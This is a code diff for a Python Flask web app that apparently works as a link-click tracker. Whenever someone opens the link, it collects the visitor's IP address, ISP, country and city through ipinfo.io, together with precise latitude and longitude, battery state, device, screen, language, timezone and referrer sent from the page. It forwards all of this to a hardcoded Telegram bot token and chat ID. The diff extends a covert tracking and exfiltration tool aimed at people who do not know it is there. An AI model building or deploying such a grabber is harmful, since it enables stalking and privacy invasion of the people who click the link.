@@ -1,51 +1,63 @@
 from flask import Flask, request, render_template
 import requests
-import datetime
-import pytz
-import os
+from datetime import datetime
 
 app = Flask(__name__)
 
-# Telegram bot config
+# ⬇️ Your bot token and chat ID
 BOT_TOKEN = '7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo'
 CHAT_ID = '6690693429'
 
-@app.route("/", methods=["GET", "POST"])
-def home():
-    if request.method == "POST":
-        try:
-            data = request.get_json()
-            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-ip = ip.split(",")[0].strip()  # Only first IP (real one)
-            user_agent = request.headers.get('User-Agent')
-            latitude = data.get('latitude', 'N/A')
-            longitude = data.get('longitude', 'N/A')
+def send_telegram(msg):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}
+    requests.post(url, data=data)
 
-            now = datetime.datetime.now(pytz.timezone("Asia/Kolkata"))
-            current_time = now.strftime("%d-%b-%Y %I:%M %p")
+def get_ip_info(ip):
+    try:
+        response = requests.get(f"https://ipinfo.io/{ip}/json").json()
+        return {
+            "ip": ip,
+            "city": response.get("city", ""),
+            "region": response.get("region", ""),
+            "country": response.get("country", ""),
+            "loc": response.get("loc", ""),
+            "org": response.get("org", "")
+        }
+    except:
+        return {"ip": ip}
 
-            message = f"""
-📥 New Click Logged!
-
-🌐 IP: {ip}
-📍 Coordinates: {latitude}, {longitude}
-🧠 Browser: {user_agent}
-🕒 Time: {current_time}
-"""
-            # Send to Telegram
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": CHAT_ID,
-                "text": message
-            }
-            requests.post(url, data=payload)
-
-        except Exception as e:
-            print("Error:", e)
-
-        return "OK"
-
+@app.route('/')
+def index():
     return render_template("index.html")
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.json
+    forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
+    real_ip = forwarded.split(",")[0].strip()
+    ip_info = get_ip_info(real_ip)
+
+    msg = f"""📥 <b>New Click Logged!</b>
+
+🌐 <b>IP:</b> {ip_info.get("ip")}
+🌎 <b>Country:</b> {ip_info.get("country")} | <b>City:</b> {ip_info.get("city")}
+📡 <b>ISP:</b> {ip_info.get("org")}
+
+📍 <b>Location:</b> {data.get("lat")}, {data.get("lon")}
+🔋 <b>Battery:</b> {data.get("battery_level", '?')}% (Charging: {data.get("charging", '?')})
+
+📱 <b>Device:</b> {data.get("device")}
+🧠 <b>Browser:</b> {data.get("browser")}
+📏 <b>Screen:</b> {data.get("screen")}
+🗣 <b>Language:</b> {data.get("language")}
+🕒 <b>Timezone:</b> {data.get("timezone")}
+🔗 <b>Referrer:</b> {data.get("referrer") or 'None'}
+
+🕒 <b>Time:</b> {datetime.now().strftime('%d-%b-%Y %I:%M %p')}
+"""
+    send_telegram(msg)
+    return {'status': 'ok'}
+
+if __name__ == '__main__':
+    app.run(debug=True)
